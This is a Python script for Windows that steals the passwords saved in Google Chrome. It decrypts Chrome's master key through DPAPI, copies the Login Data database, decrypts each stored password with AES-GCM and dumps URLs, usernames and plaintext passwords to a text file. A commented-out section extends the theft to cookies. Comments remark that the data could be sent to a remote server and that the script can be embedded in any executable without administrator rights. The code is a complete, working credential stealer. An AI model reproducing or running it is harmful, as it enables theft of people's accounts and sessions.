import os
import time

if os.name != "nt":
    print("Your version is not supported yet. This only currently works on windows.")
    time.sleep(2)
    exit()

import json
import base64
import sqlite3
import shutil
import threading
import sys

mlist = []

try:
    from Cryptodome.Cipher import AES
except ModuleNotFoundError:
    mlist.append(["pycryptodomex==3.9.7"])
try:
    import win32crypt
except ModuleNotFoundError:
    mlist.append(["pywin32"])

def install_req_packages(ls):
    conf = input("Before procedding, we will need to install the following packages: (PLEASE MAKE SURE YOUR INTERNET IS CONNECTED)\n -> "+ "\n -> ".join([i[0] for i in ls]) + "\nProceed? (Y/N): " )
    if conf in ["y", "Y"]:
        for i in ls:
            os.system("python -m pip install " + i[0])
            time.sleep(1)
        print("Installation complete. Please run script again.")
    else:
        print("Installation cancelled. We will need to abort.")
        time.sleep(2)
        exit()
    
def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)
def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        # print("Probably saved password from Chrome version older than v80\n")
        # print(str(e))
        return "Chrome < 80"


def main():
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    shutil.copy2(login_db, "snake1.db")
    conn = sqlite3.connect("snake1.db")
    cursor = conn.cursor()
    data = []
    try:
       cursor.execute("SELECT signon_realm, username_value, password_value FROM logins")
       for r in cursor.fetchall():
           url = r[0]
           username = r[1]
           encrypted_password = r[2]
           decrypted_password = decrypt_password(encrypted_password, master_key)
           if len(decrypted_password) > 0:
               data.append({"url":url, "username":username, "pass": decrypted_password})
    except Exception as e:
       pass
    cursor.close()
    conn.close()
    try:
       os.remove("snake1.db")
    except Exception as e:
       pass
       
    # Chrome has changed the way cookies are stored, so this method doesn't work anymore!
    
    # login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Cookies'
    # shutil.copy2(login_db, "snake1.db")
    # conn = sqlite3.connect("snake1.db")
    # cursor = conn.cursor()
    # data2 = []
    # try:
       # cursor.execute("SELECT host_key, name, encrypted_value, is_secure, is_httponly, has_expires, is_persistent, priority, samesite, source_scheme FROM cookies")
       # for r in cursor.fetchall():
           # url = r[0]
           # name = r[1]
           # is_secure, is_httponly, has_expires, is_persistent, priority, samesite, source_scheme = r[3], r[4], r[5], r[6], r[7], r[8], r[9]
           # encrypted_cookies = r[2]
           # decrypted_cookies = decrypt_password(encrypted_cookies, master_key)
           # if len(decrypted_cookies) > 0:
               # data2.append({"url":url, "name":name, "value": decrypted_cookies, "is_secure":is_secure, "is_httponly": is_httponly, "has_expires": has_expires, "is_persistent": is_persistent, "priority": priority, "samesite": samesite, "source_scheme":source_scheme})
    # except Exception as e:
        # pass
    # cursor.close()
    # conn.close()
    # try:
       # os.remove("snake1.db")
    # except Exception as e:
       # pass
    
    #
    #  HERE, SOMEONE CAN SEND data and data2 TO HIS SERVER, AND GUESS WHAT? OUR PASSWORDS AND COOKIES ARE NOW AVAILABLE TO SOMEONE.
    #  THIS SCRIPT CAN BE EMBEDDED IN ANY EXECUTABLE, AND IT EVEN DON'T REQUIRE ADMINISTRATIVE ACCESS.
    #
    
    with open("passwords.txt", "w") as outfile:
        json.dump(data, outfile, indent=4)
    # with open("cookies.txt", "w") as outfile:
        # json.dump(data2, outfile, indent=4)
       
if mlist:
    install_req_packages(mlist)
thread = threading.Thread(target=main)
thread.start()
